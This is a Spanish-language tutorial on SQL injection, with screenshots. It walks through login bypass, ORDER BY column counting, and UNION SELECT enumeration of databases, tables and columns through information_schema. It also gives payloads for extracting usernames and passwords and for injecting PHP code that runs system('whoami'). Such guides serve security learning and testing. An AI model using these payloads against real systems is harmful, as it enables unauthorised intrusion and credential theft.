### Autenticación débil basada en SQL:
- Formulario de inicio de sesión (username - passwd) donde la inyección intenta **eludir la autenticación.**
```sql
SELECT * FROM users WHERE username='' AND passwd=''
1. username='admin' or 1=1-- - AND passwd='admin'
2. username='admin' or 1=1#
3. user='admin' -- || user='admin'-- -
```
<p align="center">
  <img src="https://i.postimg.cc/Fs1s7nJQ/sql-ejemplo-bool.png" alt="sql"/>
</p>
#### Determina el número de columnas devueltas por la consulta
- Aprovechando el manejo de error en la respuesta para saber el total de columnas.
```sql
SELECT password,email FROM users WHERE username='pepe'' order by 2-- -
1. username order by 2-- -
2. username order by 3-- -//Devuelve error ya que al comienzo solo se seleccionan 2
```
<p align="center">
  <img src="https://i.postimg.cc/Z5MNWdqw/sql-ejemplo-error-ORDER-BY.png" alt="sql"/>
</p>
**Error ORDER BY**
<p align="center">
  <img src="https://i.postimg.cc/pL3FQXxF/ERROR-sql.png" alt="sql"/>
</p>

- Combinar del 1 hasta el total de columnas de la tabla con UNION SELECT
```sql
SELECT password,email FROM users WHERE username='pepe' union select 1,2-- -
SELECT password,email FROM users WHERE username='pepe' union select NULL,NULL-- -
//Este último va en la URL
```
+ Mostrar una posible inyección de código PHP
```sql
SELECT password,email FROM users WHERE id=1 UNION SELECT "<?php system('whoami'); ?>",user();-- -;
```
<p align="center">
  <img src="https://i.postimg.cc/Z5KPBmx5/sql-inyeccion-code-y-dbuser.png" alt="sql"/>
</p>
- Mas ejemplos con el uso de UNION SELECT '',''-- -
<p align="center">
  <img src="https://i.postimg.cc/6qxB0qpy/mas-ejemplos-con-UNION.png" alt="sql"/>
</p>
+ Utilizando una inyección de código hacia un directorio como **/etc/hosts** o **/etc/passwd**
<p align="center">
  <img src="https://i.postimg.cc/1X0nT1WV/load-file-sql.png" alt="sql"/>
</p>
---
+ **Recupera las bases de datos disponibles en el servidor - LISTAR DBS**
```sql
//Ejemplo por consola
SELECT username,password FROM users WHERE category=Accessories' UNION SELECT username,group_concat(schema_name) FROM information_schema.schemata-- -
```
```SQL
//Esto va en la URL
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
```
- **Recupero "todas" las tablas creadas en cada base de datos. - LISTAR TABLAS**
```SQL
//Esto va en la URL
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
```
-  LISTAR COLUMNA
<p align="center">
  <img src="https://i.postimg.cc/7ZT8y18D/tabla-y-dbs.png" alt="sql"/>
</p>
```sql
SELECT username,password FROM users WHERE category=Accessories' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -
```
information_schema.tables > Muestra todas las tablas

- Leer todos los nombres de usuario y contraseña de una tabla
```sql
SELECT username,password FROM users WHERE category=Accessories' UNION SELECT username,password FROM users-- -
```
<p align="center">
  <img src="https://i.postimg.cc/Fs1s7nJQ/sql-ejemplo-bool.png" alt="sql"/>
</p>
---
## Tipos de inyecciones y "paso a paso".

##### 1.er Paso:
### ' ORDER BY [num_columns]-- -

Determina `' ORDER BY [num]-- -` el número de columnas en la tabla de la base de datos.
<p align="center">
  <img src="https://i.postimg.cc/N0GGQs8R/sqli.png" alt="sqli"/>
</p>
+ Ejemplo.
```url
https://example.com/filter?category=gift' ORDER BY 1-- -
https://example.com/filter?category=gift' ORDER BY 2-- -
https://example.com/filter?category=gift' ORDER BY 3-- -
https://example.com/filter?category=gift' ORDER BY 4-- -
```
<p align="center">
  <img src="https://i.postimg.cc/W1tQcpBz/image.png" alt="sql"/>
</p>
**"Al obtener un error se sabe que el número anterior es el número de columnas."**
##### 2.do Paso:

### ' UNION SELECT [NULL x cant_columns]-- -
<p align="center">
  <img src="https://i.postimg.cc/76KsrqhX/imagen.png" alt="sql"/>
</p>

- Ejemplos
1. Descubrir los nombres de las DB.
```SQL
SELECT * FROM tabla UNION SELECT schema_name,2,3,4 FROM information_schema.schemata;-- -;
```
2. Descubrir las tablas creadas dentro de cada DB.
```SQL
SELECT * FROM tabla UNION SELECT table_name,2,3,4 FROM information_schema.tables;-- -;
```
3. Descubrir las tablas dentro de una DB específica.
```SQL
SELECT * FROM tabla UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='name_DB';-- -;
```
4. Ver las columnas de una tabla.
```SQL
SELECT * FROM tabla UNION SELECT column_name, 2, 3, 4 FROM information_schema.columns WHERE table_name='users' AND table_schema='name_DB';-- -;
```
5. Ver los datos dentro de una DB
```SQL
SELECT username,password FROM users UNION SELECT username,password FROM login.users;
```
